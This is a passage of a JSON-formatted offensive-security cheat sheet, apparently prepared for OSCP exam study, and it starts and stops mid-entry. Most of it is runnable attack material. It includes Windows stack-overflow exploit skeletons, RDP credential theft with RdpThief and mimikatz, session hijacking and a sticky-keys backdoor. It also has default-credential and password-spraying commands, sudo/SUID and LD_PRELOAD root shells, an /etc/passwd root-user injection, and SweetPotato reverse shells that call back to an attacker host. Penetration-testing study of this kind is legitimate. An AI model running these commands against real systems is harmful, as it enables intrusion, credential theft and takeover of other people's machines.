        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Techniques to overcome memory protections:\n- **Non-ASLR modules**: Find modules compiled without /DYNAMICBASE\n- **ROP (Return Oriented Programming)**: Chain existing code gadgets to bypass DEP\n- **Information leaks**: Obtain runtime addresses to defeat ASLR\n- **Partial overwrites**: Overwrite only part of return address",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Exploit Development Workflow [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Standard process for developing a stack overflow exploit:\n1. Identify the crash (fuzzing or analysis)\n2. Determine offset to EIP control\n3. Identify bad characters\n4. Find suitable return address\n5. Generate and test shellcode\n6. Finalize and test exploit",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Aleph One - Smashing the Stack",
        "url": "http://phrack.org/issues/49/14.html"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Stack buffer overflows occur when data written to a stack buffer exceeds its allocated size, overwriting adjacent memory including saved return addresses."
      }
    ]
  },
  {
    "category": "Stack Overflow Exploitation",
    "title": "Stack Overflow Exploitation",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Stack_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Generate Crash Pattern",
        "codes": [
          {
            "lang": "bash",
            "code": "msf-pattern_create -l <Length>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use Metasploit pattern to determine exact offset to EIP."
          }
        ]
      },
      {
        "title": "Find Offset from EIP Value",
        "codes": [
          {
            "lang": "bash",
            "code": "msf-pattern_offset -l <Length> -q <EIPValue>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine offset after crash with pattern."
          }
        ]
      },
      {
        "title": "Verify EIP Control",
        "codes": [
          {
            "lang": "python",
            "code": "offset = <Offset>\nbuffer = b\"A\" * offset\nbuffer += b\"B\" * 4      # Should appear in EIP\nbuffer += b\"C\" * 100    # Remaining buffer"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm offset by placing known value at calculated offset."
          }
        ]
      },
      {
        "title": "Verify in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> r eip\neip=42424242              ; 0x42 = 'B' confirms control"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check that EIP contains expected value."
          }
        ]
      },
      {
        "title": "Identify Shellcode Space",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> dd esp L50        ; Check stack after crash\n0:000> db esp L200       ; Look for our buffer (C's = 0x43)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine how much space is available for shellcode."
          }
        ]
      },
      {
        "title": "Bad Character Identification",
        "codes": [
          {
            "lang": "python",
            "code": "badchars = (\n    b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\"\n    b\"\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\n    b\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\"\n    b\"\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\"\n    b\"\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\"\n    b\"\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\n    b\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\"\n    b\"\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\n    b\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\"\n    b\"\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\n    b\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\"\n    b\"\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\n    b\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n    b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\"\n    b\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\"\n    b\"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find characters that break the exploit."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**Note**: 0x00 (NULL) is almost always bad. Send badchars after EIP and check memory for truncation or modification."
          }
        ]
      },
      {
        "title": "Check for Bad Characters in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> db esp L100       ; Look for breaks in sequence"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Compare memory against expected badchars sequence."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "If sequence stops or changes (e.g., 0x0a appears as 0x00), that character is bad."
          }
        ]
      },
      {
        "title": "Construct Basic Exploit",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\n\noffset = <Offset>\neip = struct.pack(\"<I\", <ReturnAddress>)    # JMP ESP address\nnops = b\"\\x90\" * 16                          # NOP sled\nshellcode = b\"\"                              # Your shellcode\n\nbuffer = b\"A\" * offset\nbuffer += eip\nbuffer += nops\nbuffer += shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Assemble the final buffer structure."
          }
        ]
      },
      {
        "title": "Stack Pivot (If Needed)",
        "codes": [
          {
            "lang": "python",
            "code": "# If shellcode is before EIP, use negative jump\n# add esp, -500; jmp esp\n\n# Or use SUB ESP gadget"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Adjust ESP if shellcode lands at different location."
          }
        ]
      },
      {
        "title": "Common Bad Characters",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Characters often filtered or causing issues:\n- **0x00**: NULL terminator\n- **0x0a**: Line feed (newline)\n- **0x0d**: Carriage return\n- **0x20**: Space\n- **0x09**: Tab",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Corelan Exploit Writing Tutorial",
        "url": "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Practical techniques for exploiting stack buffer overflows on Windows."
      }
    ]
  },
  {
    "category": "RDP Attacks",
    "title": "Stealing Credentials from RDP",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "RDP Credential Hooking",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hook RDP client to capture credentials when admin connects.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "RdpThief (Inject into mstsc.exe)",
        "codes": [
          {
            "lang": "bash",
            "code": "RdpThief.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Mimikatz RDP Credential Dump",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nts::mstsc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "RDP Session Hijacking",
        "codes": [
          {
            "lang": "bash",
            "code": "query user"
          },
          {
            "lang": "bash",
            "code": "tscon <SessionID> /dest:console"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires SYSTEM. Hijack disconnected sessions without credentials.",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Get SYSTEM for Hijacking",
        "codes": [
          {
            "lang": "bash",
            "code": "sc create sesshijack binpath=\"cmd.exe /k tscon <SessionID> /dest:console\"\nnet start sesshijack"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Strategy",
    "title": "Step 1: Default Credentials",
    "tags": [],
    "steps": [
      {
        "title": "Common Defaults to Try",
        "codes": [
          {
            "lang": "plaintext",
            "code": "admin:admin\nadministrator:administrator\nadmin:password\nadmin:Password1\nroot:root\nroot:toor"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Service-Specific Defaults",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# MySQL\nroot:(blank)\nroot:root\n\n# PostgreSQL\npostgres:postgres\n\n# MSSQL\nsa:(blank)\nsa:sa\n\n# Tomcat\ntomcat:tomcat\nadmin:admin\n\n# Jenkins\nadmin:admin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Quick Test",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try admin:admin first\ncrackmapexec smb <TargetIP> -u admin -p admin\n\n# Try administrator:administrator\ncrackmapexec smb <TargetIP> -u administrator -p administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "If this works, you just saved hours of work!",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "**Always start here!** Many systems still use default credentials.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Step 2: Username as Password",
    "tags": [],
    "steps": [
      {
        "title": "Testing Strategy",
        "codes": [
          {
            "lang": "bash",
            "code": "# If you have usernames\ncrackmapexec smb <TargetIP> -u users.txt -p users.txt --no-bruteforce\n\n# Single user\ncrackmapexec smb <TargetIP> -u john -p john"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Why This Works",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- Lazy password policies\n- Temporary accounts\n- Testing/development accounts\n- Service accounts"
          }
        ]
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "**Second most common** - users often set their password to their username.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Step 3: Credential Reuse",
    "tags": [],
    "steps": [
      {
        "title": "Found Credentials Checklist",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2713 Try on all discovered services\n\u2713 Try on all discovered hosts\n\u2713 Try with different usernames\n\u2713 Try variations (uppercase, lowercase)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Workflow",
        "codes": [
          {
            "lang": "bash",
            "code": "# Found MySQL creds: root:Password123\n# Try on SSH\nssh root@<TargetIP>\n# Password: Password123\n\n# Try on SMB\ncrackmapexec smb <TargetIP> -u root -p 'Password123'\n\n# Try on WinRM\nevil-winrm -i <TargetIP> -u root -p 'Password123'\n\n# Try on RDP\nxfreerdp3 /u:root /p:'Password123' /v:<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "**If you found ANY credentials, try them EVERYWHERE!**",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Step 4: Password Spraying",
    "tags": [],
    "steps": [
      {
        "title": "Common Password List",
        "codes": [
          {
            "lang": "plaintext",
            "code": "password\npassword1\nPassword1\nPassword123\nPassword@123\nWelcome1\nWelcome123\nWelcome@123\nCompany123\nCompany2024\nSummer2024\nWinter2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create spray list\ncat > spray.txt << EOF\npassword\nPassword1\nWelcome1\nPassword123\nEOF\n\n# Spray against all users\ncrackmapexec smb <TargetIP> -u users.txt -p spray.txt --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Be careful with account lockout policies! Space out attempts if needed.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Try a few common passwords against all users. **Much faster than brute-forcing!**",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Step 5: Dealing with Passwords",
    "tags": [],
    "steps": [
      {
        "title": "When Brute-Forcing is Necessary",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Only brute-force when:\n- You have a valid username\n- Default credentials failed\n- Password spraying failed\n- You have a good wordlist",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Best Practices",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Have valid usernames first**\n2. **Don't forget trying `admin:admin`**\n3. **Try `username:username` as first credential**\n4. **If related to a service, try default passwords**\n5. **Service name as username AND password**\n6. **Use Rockyou.txt only after trying common passwords**"
          }
        ]
      },
      {
        "title": "Common Mistakes to Avoid",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u274c Starting with rockyou.txt immediately\n\u274c Brute-forcing without valid usernames\n\u274c Not trying credential reuse\n\u274c Ignoring default credentials\n\u274c Not checking for account lockout"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Sticky Keys Backdoor",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Replace sethc.exe",
        "codes": [
          {
            "lang": "bash",
            "code": "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires prior access or boot from external media.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Trigger at Login",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Press Shift 5 times at login screen for Command prompt as SYSTEM.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SEH Theory",
    "title": "Structured Exception Handling Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "SEH_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "SEH Overview [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SEH allows programs to gracefully handle exceptions like access violations, divide by zero, etc:\n- **Exception**: An abnormal condition during execution\n- **Handler**: Code that responds to the exception\n- **SEH Chain**: Linked list of exception handlers on the stack",
            "variant": "info"
          }
        ]
      },
      {
        "title": "SEH Chain Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "+------------------+\n| Exception Handler|  <- Address of handler function\n+------------------+\n|   Next SEH Ptr   |  <- Pointer to next SEH record (nSEH)\n+------------------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Each SEH record contains two pointers stored on the stack."
          }
        ]
      },
      {
        "title": "SEH Chain in Memory [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "FS:[0] -> SEH Record 1 -> SEH Record 2 -> ... -> 0xFFFFFFFF\n          [nSEH][Handler]  [nSEH][Handler]        (End marker)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Multiple handlers form a linked list."
          }
        ]
      },
      {
        "title": "TEB and FS Segment [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "FS:[0x00] = Pointer to current SEH record\nFS:[0x18] = Pointer to TEB itself"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The Thread Environment Block contains pointer to SEH chain."
          }
        ]
      },
      {
        "title": "View SEH Chain in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "!exchain                    ; Show SEH chain\ndt ntdll!_EXCEPTION_REGISTRATION_RECORD poi(fs:[0])"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Display the current exception handler chain."
          }
        ]
      },
      {
        "title": "Exception Handling Flow [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What happens when an exception occurs:\n1. CPU raises exception\n2. OS walks SEH chain from FS:[0]\n3. Each handler is called with exception info\n4. Handler returns: continue execution, continue search, or nested exception\n5. If no handler handles it, process terminates",
            "variant": "info"
          }
        ]
      },
      {
        "title": "SEH Handler Function Prototype [Knowledge]",
        "codes": [
          {
            "lang": "c",
            "code": "EXCEPTION_DISPOSITION __cdecl handler(\n    EXCEPTION_RECORD *ExceptionRecord,\n    void *EstablisherFrame,      // Pointer to our SEH record\n    CONTEXT *ContextRecord,\n    void *DispatcherContext\n);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Handler function receives specific parameters."
          }
        ]
      },
      {
        "title": "SafeSEH Protection [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Compiler-based protection validates handlers:\n- **SafeSEH**: List of valid handlers compiled into executable\n- **SEHOP**: SEH Overwrite Protection (validates chain integrity)\n- Handlers must be in SafeSEH table or in non-SafeSEH module",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "SEH Validation Checks [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Windows performs several validations before calling handler:\n1. Handler must not be on the stack\n2. Handler must be in executable memory\n3. Handler must be in SafeSEH table (if module uses SafeSEH)\n4. SEHOP validates chain structure and final handler",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Viewing SEH Chain Details",
        "codes": [
          {
            "lang": "text",
            "code": "dd poi(fs:[0])              ; First SEH record\ndd poi(poi(fs:[0]))         ; Second SEH record (nSEH of first)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Examine individual SEH records."
          }
        ]
      },
      {
        "title": "End of Chain Marker [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "0xFFFFFFFF marks end of SEH chain\nFinal handler is typically ntdll!FinalExceptionHandler"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The final SEH record has nSEH = 0xFFFFFFFF."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft SEH Documentation",
        "url": "https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Windows Structured Exception Handling (SEH) provides a mechanism to handle hardware and software exceptions. SEH overwrites exploit this mechanism for code execution."
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Success Metrics",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "You're Ready If:",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **You can root 3 TJNull machines in 8 hours**\n2. **You can enumerate AD with BloodHound**\n3. **You can pivot through dual-homed machines**\n4. **You can stabilize shells manually**\n5. **You understand common privilege escalation**\n6. **You can document as you work**\n7. **You don't rely on Metasploit**\n8. **You've earned bonus points**"
          },
          {
            "type": "note",
            "content": "If you can consistently root TJNull machines, you're ready for the exam.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Sudo Exploitation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation",
      "include"
    ],
    "steps": [
      {
        "title": "Check Sudo Rights",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo -l"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GTFOBins Shell Escapes",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo vim -c ':!/bin/bash'\nsudo find /etc -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'\nsudo env /bin/bash\nsudo less /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "In less/more/man: `!/bin/bash`"
          }
        ]
      },
      {
        "title": "Sudo vi/vim",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo vi /allowed/path\n:set shell=/bin/sh\n:shell"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Alternative method using `:set shell`."
          }
        ]
      },
      {
        "title": "Sudo apt",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Sudo gcc",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo gcc -wrapper /bin/sh,-s ."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "LD_PRELOAD Exploitation",
        "codes": [
          {
            "lang": "c",
            "code": "#include <stdio.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0); setuid(0);\n    system(\"/bin/bash\");\n}"
          },
          {
            "lang": "bash",
            "code": "gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles\nsudo LD_PRELOAD=/tmp/shell.so <allowed_command>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If `env_keep+=LD_PRELOAD` in sudo -l:"
          }
        ]
      },
      {
        "title": "CVE-2019-14287",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo -u#-1 /bin/bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If sudo rule: `(ALL, !root) /bin/bash`"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "If you get \"Permission denied\" error, check `/var/log/syslog` to see if AppArmor is blocking (enabled by default on Debian 10+).",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "SUID Exploitation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Find SUID Binaries",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null"
          },
          {
            "lang": "bash",
            "code": "find / -perm -u=s -type f 2>/dev/null"
          },
          {
            "lang": "bash",
            "code": "find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Last command checks common locations only (faster)."
          }
        ]
      },
      {
        "title": "Find SGID Binaries",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -perm -2000 -type f 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GTFOBins SUID Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "# Example: find SUID\n/usr/bin/find . -exec /bin/sh -p \\; -quit"
          },
          {
            "lang": "bash",
            "code": "# Example: vim SUID\nvim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check [GTFOBins](https://gtfobins.github.io/) for SUID exploitation techniques."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Summary",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Shell stabilization is crucial for:\n- Efficient enumeration\n- Running privilege escalation scripts\n- Using text editors\n- Better overall experience\n- Not accidentally killing your shell",
        "variant": "important"
      },
      {
        "type": "note",
        "content": "Master the Python PTY method - it works in 99% of cases and takes only 10 seconds!",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Summary",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Writable /etc/passwd = Instant Root\n- Check permissions: `ls -l /etc/passwd`\n- Generate hash: `openssl passwd password`\n- Add user with UID 0: `echo 'user:hash:0:0:...' >> /etc/passwd`\n- Switch user: `su user`\n- Verify: `whoami` should show `root`",
        "variant": "important"
      },
      {
        "type": "note",
        "content": "This is one of the easiest privilege escalation methods when available!",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Summary Checklist",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\nBefore Brute-Forcing, Have You:\n\u2610 Tried admin:admin?\n\u2610 Tried username:username?\n\u2610 Tried default credentials for the service?\n\u2610 Tried credential reuse from other services?\n\u2610 Tried password spraying with common passwords?\n\u2610 Checked for password hints in enumeration?\n\u2610 Verified you have valid usernames?\n\u2610 Checked account lockout policy?\n\u2610 Considered if brute-forcing is really necessary?\n```"
      },
      {
        "type": "note",
        "content": "If you answered \"No\" to any of these, do that first before brute-forcing!",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "SweetPotato",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/SweetPotato.exe -Outfile SweetPotato.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "SweetPotato.exe -p C:\\Windows\\Temp\\nc.exe -a \"<AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Specify Technique",
        "codes": [
          {
            "lang": "bash",
            "code": "SweetPotato.exe -e EfsRpc -p C:\\Windows\\Temp\\nc.exe -a \"<AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Available techniques: EfsRpc, WinRM, TokenSteal",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "SweetPotato GitHub",
        "url": "https://github.com/CCob/SweetPotato"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Unified toolkit that combines multiple potato techniques and auto-selects the best one. Works across multiple Windows versions.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Symbol Resolution",
    "title": "Symbol Resolution in Shellcode",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Export Directory Overview [Knowledge]",
        "codes": [
          {
